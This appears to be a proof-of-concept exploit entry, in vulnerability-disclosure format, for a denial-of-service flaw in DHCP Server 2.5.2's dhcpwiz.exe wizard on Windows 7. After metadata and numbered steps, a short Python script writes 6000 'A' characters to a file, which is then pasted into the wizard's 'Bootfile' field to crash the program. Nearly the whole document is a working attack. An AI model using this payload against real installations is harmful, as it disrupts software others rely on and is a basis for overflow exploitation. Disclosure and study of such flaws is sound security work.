#Exploit Title: DHCP Server 2.5.2 - Denial of Service (PoC)
#Discovery by: Victor Mondragón
#Discovery Date: 2019-04-16
#Vendor Homepage: http://www.dhcpserver.de/cms/
#Software Link: http://www.dhcpserver.de/cms/wp-content/plugins/download-attachments
#Tested Version: 2.5.2
#Tested on: Windows 7 x32 Service Pack 1

#Steps to produce the crash:
#1.- Run python code: DHCPSRV_2.5.2.py
#2.- Open dhcp.txt and copy content to clipboard
#2.- Open dhcpwiz.exe 
#3.- Click Next
#4.- In Network Interface cards Select "Local Area Connection" and click on Next 
#5.- In Supported Protocols click on Next 
#6.- In Configuring DHCP for Interface Select "DHCP Options"
#7.- Select "Bootfile" field and Paste ClipBoard
#8.- Crashed

cod = "\x41" * 6000
f = open('dhcp.txt', 'w')
f.write(cod)
f.close()